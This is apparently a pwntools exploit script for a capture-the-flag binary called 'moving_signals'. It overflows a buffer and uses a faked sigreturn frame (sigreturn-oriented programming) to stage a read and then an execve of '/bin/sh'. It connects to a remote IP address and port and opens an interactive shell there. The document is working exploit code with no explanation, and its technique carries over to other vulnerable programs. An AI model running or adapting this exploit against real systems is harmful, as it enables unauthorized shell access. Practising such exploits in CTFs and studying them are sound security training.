from pwn import *

elf = context.binary = ELF("./moving_signals")
context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h"]
def do_debug():
	return gdb.debug(elf.path, gdbscript = """
												break *0x41000
""")
def do_local():
	return process(elf.path)

def do_remote():
	return remote("161.97.176.150", 2525)
pop_rax = 0x41018
start_offset = 0x41000
syscall_ret = 0x41015
#p = do_debug()
#p = do_local()
p = do_remote()
#payload = b"A"*8 + p64(pop_rax) + p64(pop_rdi) + p64(0x41005) + p64(pop_rax) + p64(ret) +\
#p64(0x41005) + p64(pop_rax) + p64(push_rsp) + p64(0x41005) + p64(pop_rax) +\
#p64(0x41000) + p64(pop_rdi) + p64(start_offset)
payload = b"A"*8 + p64(pop_rax) + p64(15) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x41025
frame.rdx = 0x300
frame.rsp = 0x41025
frame.rip = syscall_ret
payload += bytes(frame)
p.send(payload)
input("...")
payload = p64(pop_rax) + p64(15) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x41025+248 + 0x18
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x41000
frame.rip = syscall_ret
payload += bytes(frame) + b"/bin/sh\x00"
p.send(payload)
p.interactive()
#0x41013 longer read distance
